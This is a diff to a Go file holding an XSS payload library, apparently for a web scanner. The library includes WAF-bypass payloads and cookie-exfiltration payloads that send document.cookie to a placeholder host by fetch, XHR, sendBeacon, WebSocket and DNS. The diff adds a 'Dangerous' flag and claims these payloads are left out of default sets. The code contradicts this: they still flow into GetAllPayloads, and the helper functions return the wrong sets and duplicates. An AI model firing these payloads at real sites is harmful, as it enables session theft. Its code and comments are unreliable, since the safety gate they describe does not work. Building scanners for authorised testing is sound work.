@@ -24,11 +24,12 @@ const (
 
 // Payload represents a test payload with metadata
 type Payload struct {
-	Value    string
-	Context  Context
-	Tag      string   // Tags: "basic", "img", "svg", "event", "encode", "waf-bypass"
-	WAF      string   // Target WAF: "generic", "cloudflare", "aws", "modsec", ""
-	Encoding string   // Encoding: "none", "url", "html-entity", "unicode", "base64"
+	Value      string
+	Context    Context
+	Tag        string   // Tags: "basic", "img", "svg", "event", "encode", "waf-bypass"
+	WAF        string   // Target WAF: "generic", "cloudflare", "aws", "modsec", ""
+	Encoding   string   // Encoding: "none", "url", "html-entity", "unicode", "base64"
+	Dangerous  bool     // true if payload sends data to external servers
 }
 
 // GetBasePayloads returns core XSS payloads organized by context
@@ -291,7 +292,7 @@ func GetWafBypassPayloads() []Payload {
 		`<img src=x onerror=alert(1)>`,
 		`<svg onload=alert(1)>`,
 		`<iframe src="javascript:alert(1)">`,
-		`<img src=x onerror=window.location='http://evil.com/?c='+document.cookie>`,
+		`<img src=x onerror=window.location='http://YOUR_DOMAIN.example/?c='+document.cookie>`,
 		`<svg/onload=alert(1)>`,
 		`<img src=x onerror=alert&#40;1&#41;>`,
 		`<img src=x onerror=alert(1)//`,
@@ -368,7 +369,7 @@ func GetWafBypassPayloads() []Payload {
 		`jsonp=alert(1)`,
 		`callback=alert&_=1`,
 		`cb=function(){alert(1)}()`,
-		`callback=document.location='http://evil.com/?c='+document.cookie`,
+		`callback=document.location='http://YOUR_DOMAIN.example/?c='+document.cookie`,
 		`%61%6c%65%72%74(1)`,  // encoded callback name
 		`callback=window["al"+"ert"](1)`,
 	}
@@ -450,24 +451,26 @@ func GetWafBypassPayloads() []Payload {
 		payloads = append(payloads, Payload{Value: p, Context: ContextHTML, Tag: "framework", WAF: ""})
 	}
 
-	// === Data Exfiltration ===
+	// === Data Exfiltration (DANGEROUS - disabled by default) ===
+	// These payloads send data to external servers and are marked as Dangerous.
+	// They are NOT included in default payload sets. Use GetExfilPayloads() explicitly.
 	exfil := []string{
-		// Image beacon
-		`<img src="http://evil.com/?c='+document.cookie+'">`,
-		// Fetch
-		`<script>fetch('http://evil.com/?c='+document.cookie)</script>`,
-		// XMLHttpRequest
-		`<script>var x=new XMLHttpRequest();x.open('GET','http://evil.com/?c='+document.cookie);x.send()</script>`,
-		// Navigator.sendBeacon
-		`<script>navigator.sendBeacon('http://evil.com',document.cookie)</script>`,
-		// WebSocket
-		`<script>var ws=new WebSocket('ws://evil.com');ws.onopen=function(){ws.send(document.cookie)}</script>`,
-		// DNS exfiltration
-		`<script>new Image().src='http://'+document.cookie+'.evil.com'</script>`,
+		// Image beacon - uses placeholder domain, must be replaced
+		`<img src="http://YOUR_DOMAIN.example/?c='+document.cookie+'">`,
+		// Fetch - uses placeholder domain, must be replaced
+		`<script>fetch('http://YOUR_DOMAIN.example/?c='+document.cookie)</script>`,
+		// XMLHttpRequest - uses placeholder domain, must be replaced
+		`<script>var x=new XMLHttpRequest();x.open('GET','http://YOUR_DOMAIN.example/?c='+document.cookie);x.send()</script>`,
+		// Navigator.sendBeacon - uses placeholder domain, must be replaced
+		`<script>navigator.sendBeacon('http://YOUR_DOMAIN.example',document.cookie)</script>`,
+		// WebSocket - uses placeholder domain, must be replaced
+		`<script>var ws=new WebSocket('ws://YOUR_DOMAIN.example');ws.onopen=function(){ws.send(document.cookie)}</script>`,
+		// DNS exfiltration - uses placeholder domain, must be replaced
+		`<script>new Image().src='http://'+document.cookie+'.YOUR_DOMAIN.example'</script>`,
 	}
 
 	for _, p := range exfil {
-		payloads = append(payloads, Payload{Value: p, Context: ContextHTML, Tag: "exfil", WAF: ""})
+		payloads = append(payloads, Payload{Value: p, Context: ContextHTML, Tag: "exfil", WAF: "", Dangerous: true})
 	}
 
 	// === Polyglot Payloads ===
@@ -562,12 +565,49 @@ func GenerateVariants(p Payload) []Payload {
 	return variants
 }
 
-// GetAllPayloads returns the complete payload library
+// GetAllPayloads returns the complete payload library (excludes dangerous exfil payloads)
 func GetAllPayloads() []Payload {
 	var all []Payload
 	all = append(all, GetBasePayloads()...)
 	all = append(all, GetWafBypassPayloads()...)
+	// Note: GetExfilPayloads() is NOT included by default due to data leakage risk
 	return all
+}
+
+// GetExfilPayloads returns data exfiltration payloads (DANGEROUS)
+// These payloads send data to external servers and should only be used
+// when you have explicit authorization and a controlled callback server.
+// WARNING: Using these payloads without authorization may violate laws.
+func GetExfilPayloads() []Payload {
+	return GetWafBypassPayloads() // Already includes exfil payloads marked as Dangerous
+}
+
+// GetDangerousPayloads returns all payloads marked as dangerous
+func GetDangerousPayloads() []Payload {
+	var dangerous []Payload
+	for _, p := range GetAllPayloads() {
+		if p.Dangerous {
+			dangerous = append(dangerous, p)
+		}
+	}
+	// Also check WAF bypass payloads
+	for _, p := range GetWafBypassPayloads() {
+		if p.Dangerous {
+			dangerous = append(dangerous, p)
+		}
+	}
+	return dangerous
+}
+
+// IsDangerousPayload checks if a payload string is marked as dangerous
+func IsDangerousPayload(payloadStr string) bool {
+	all := append(GetAllPayloads(), GetWafBypassPayloads()...)
+	for _, p := range all {
+		if p.Value == payloadStr && p.Dangerous {
+			return true
+		}
+	}
+	return false
 }
 
 // GetPayloadsByContext returns payloads filtered by context
